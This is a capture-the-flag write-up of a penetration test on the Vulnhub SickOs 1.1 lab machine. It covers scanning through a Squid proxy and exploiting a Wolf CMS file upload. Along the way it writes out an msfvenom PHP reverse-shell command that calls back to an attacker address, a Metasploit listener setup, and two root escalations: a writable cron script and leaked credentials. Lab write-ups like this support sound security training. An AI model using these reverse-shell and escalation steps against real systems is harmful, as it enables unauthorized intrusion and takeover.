# Vulnhub - SickOs 1.1

This document outlines the findings and steps taken during a penetration test performed on SickOs 1.1

## Network Scanning and Enumeration

### Nmap Scan
- **Command:** `nmap 192.168.1.25 -sV -A`
- **Findings:** Discovered an open SSH port (22/tcp) running OpenSSH 5.9p1 Debian 5ubuntu1.1, and an open HTTP-proxy Squid 3.1.19 on port 3128/tcp.

### Dirb Scan with Proxy
- **Command:** `dirb http://192.168.1.25 -p 192.168.1.25:3128`
- **Description:** Performed a directory brute force on the target web server **using a proxy**.
- **Findings:** Identified multiple accessible directories, including '/wolfcms.' The 'robots.txt' file indicated a 'Disallow' rule for '/wolfcms.'

## Web Application Analysis

### Exploiting Wolf CMS Vulnerability
-  Found an exploit for Wolf CMS (https://www.exploit-db.com/exploits/38000)

- Verified that we could upload via http://192.168.1.25/wolfcms/?/admin/plugin/file_manager/browse/

- Generated a reverse shell

`msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.22 LPORT=6667 -f raw -o shell.php`

- Created the listener via metasploit

 ```
 msfconsole
use exploit/multi/handler 
set LHOST <$LOCAL_IP>
set LPORT <$LOCAL_PORT>
set PAYLOAD php/meterpreter/reverse_tcp 
exploit
```

- Upload the shell and go to the uploaded shell : 192.168.1.25/wolfcms/public/shell.php
  
- Gaining a Meterpreter session as the 'www-data' user.

- Upgrading the dumb shell :

 `python -c 'import pty; pty.spawn("/bin/bash")'`

### Privilege Escalation - OPTION 1
- **Description:** Utilized a cron job misconfiguration to gain root access.
- **Findings:** Modified a Python script executed by a root cron job, providing root-level privileges on the target system.

Script is located at /etc/cron.d/automate and was dicorvered by our lse.sh script.

### SSH Access and Privilege Escalation - OPTION 2
- **Findings:** Used the obtained credentials ('sickos' with password 'john@123') to establish an SSH connection as the 'sickos' user. Successfully escalated privileges to root using 'sudo su.'

This information was located in /var/www/wolfcms/config.php

When connected as user sickos just use `sudo su` to get root

## Conclusion

The penetration test uncovered several vulnerabilities, including a Wolf CMS upload vulnerability, a misconfigured cron job, and a password leak in the 'config.php' file. 
